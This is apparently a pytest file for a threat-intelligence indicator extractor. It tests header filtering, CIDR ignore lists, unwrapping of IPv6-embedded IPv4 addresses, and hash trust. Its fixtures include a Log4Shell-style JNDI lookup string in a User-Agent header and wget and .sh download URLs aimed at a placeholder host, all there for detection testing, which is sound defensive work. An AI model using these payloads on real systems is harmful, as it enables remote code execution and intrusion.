"""Extraction hardening: own names, proxy headers, CIDR ignores, IPv6 tricks, demo events."""

from __future__ import annotations

from typing import Any

import pytest

from ingest.indicators import IndicatorExtractor, IndicatorSettings, normalize_host, parse_ip

S = IndicatorSettings()


def addr(*octets: int) -> str:
    return ".".join(str(o) for o in octets)


def vals(
    data: dict[str, Any], settings: IndicatorSettings = S, etype: str = "http_request"
) -> set[str]:
    return {h.value for h in IndicatorExtractor(settings).extract(etype, data)}


def test_referer_origin_and_forwarded_headers_are_never_indicators() -> None:
    headers = {
        "Referer": "http://dash.badhost.ru/x",
        "Origin": "https://dash.badhost.ru",
        "X-Forwarded-For": "http://fwd.badhost.ru/",
        "X-Forwarded-Host": "http://fwd2.badhost.ru/",
        "X-Real-IP": "http://real.badhost.ru/",
        "User-Agent": "${jndi:ldap://ldap.badhost.ru/a}",
    }
    got = vals({"headers": headers})
    assert "ldap.badhost.ru" in got
    assert not {v for v in got if "dash" in v or "fwd" in v or "real" in v}


def test_a_url_on_the_events_own_host_is_skipped() -> None:
    data = {"host": "srv.badhost.ru", "headers": {"Host": "srv.badhost.ru:8080"}, "path": "/"}
    data["query"] = "u=http://srv.badhost.ru/a v=http://other.badhost.ru/b"
    got = vals(data)
    assert "other.badhost.ru" in got and "srv.badhost.ru" not in got
    sni = {"sni": "Srv.Badhost.Ru", "body_preview": "wget http://srv.badhost.ru/x"}
    assert "srv.badhost.ru" not in vals(sni, etype="command")


def test_ignore_list_takes_cidr_blocks_addresses_and_names() -> None:
    s = IndicatorSettings(ignore=("8.8.8.0/24", "1.1.1.1", "mine.badhost.ru", "2001:4860::/32"))
    assert normalize_host("8.8.8.8", s) is None
    assert normalize_host("8.8.9.8", s) == ("ip", "8.8.9.8")
    assert normalize_host("1.1.1.1", s) is None
    assert normalize_host("a.mine.badhost.ru", s) is None
    assert normalize_host("2001:4860:4860::8888", s) is None


def test_settings_are_seeded_from_the_deployment_names() -> None:
    s = IndicatorSettings.from_env(
        {
            "INDICATORS_IGNORE": "203.0.113.0/24, extra.badhost.ru",
            "API_ALLOWED_HOSTS": "dash.badhost.ru, *",
            "API_ALLOWED_ORIGINS": "https://war.badhost.ru:8443, not a url",
        }
    )
    assert set(s.ignore) >= {
        "203.0.113.0/24",
        "extra.badhost.ru",
        "dash.badhost.ru",
        "war.badhost.ru",
    }
    assert "*" not in s.ignore and "" not in s.ignore


def test_ipv6_zone_ids_are_rejected() -> None:
    assert parse_ip("fe80::1%eth0") is None
    assert normalize_host("[2001:4860:4860::8888%5]", S) is None
    assert normalize_host("2001:4860:4860::8888", S) == ("ip", "2001:4860:4860::8888")


@pytest.mark.parametrize(
    ("wrapped", "expected"),
    [
        ("64:ff9b::808:408", ("ip", "8.8.4.8")),  # NAT64 of a public address
        ("::ffff:8.8.4.8", ("ip", "8.8.4.8")),
        ("2002:0808:0408::1", ("ip", "8.8.4.8")),  # 6to4
    ],
)
def test_embedded_ipv4_is_unwrapped_and_checked(wrapped: str, expected: tuple[str, str]) -> None:
    assert normalize_host(wrapped, S) == expected


def test_embedded_private_or_local_use_addresses_are_dropped() -> None:
    assert normalize_host("64:ff9b::a00:1", S) is None  # NAT64 of a private address
    assert normalize_host("64:ff9b::7f00:1", S) is None
    assert normalize_host("64:ff9b:1::808:408", S) is None  # local-use NAT64 prefix
    assert normalize_host("2002:0a00:0001::1", S) is None
    assert normalize_host("::ffff:" + addr(192, 168, 1, 1), S) is None
    # Teredo with a private client address (obfuscated, bits inverted)
    assert normalize_host("2001:0:4136:e378:8000:63bf:f5ff:fefe", S) is None


def test_a_hash_is_trusted_only_when_a_sensor_computed_it() -> None:
    sha = "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90"
    hits = IndicatorExtractor(S).extract("command", {"input": f"echo {sha} | sha256sum -c"})
    assert [(h.value, h.trusted) for h in hits] == [(sha, False)]
    hits = IndicatorExtractor(S).extract("download_attempt", {"url": "x", "sha256": sha})
    assert [(h.value, h.trusted) for h in hits] == [(sha, True)]


def test_nested_hash_keys_are_found() -> None:
    sha = "b1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90"
    data = {"uploads": [{"path": "/tmp/x", "sha256": sha, "size": 12}]}
    hits = IndicatorExtractor(S).extract("download_attempt", data)
    assert [(h.type, h.value, h.trusted) for h in hits] == [("hash", sha, True)]


def test_demo_events_keep_documentation_values_and_are_flagged() -> None:
    data = {"url": "http://203.0.113.66/x.sh", "demo": True}
    hits = IndicatorExtractor(S).extract("download_attempt", data)
    assert {h.value for h in hits} == {"http://203.0.113.66/x.sh", "203.0.113.66"}
    assert all(h.demo for h in hits)
    # without the marker the same values are dropped, and a real value is never flagged
    assert IndicatorExtractor(S).extract("download_attempt", {"url": data["url"]}) == []
    real = IndicatorExtractor(S).extract("download_attempt", {"url": "http://dl.badhost.ru/x"})
    assert real and not any(h.demo for h in real)
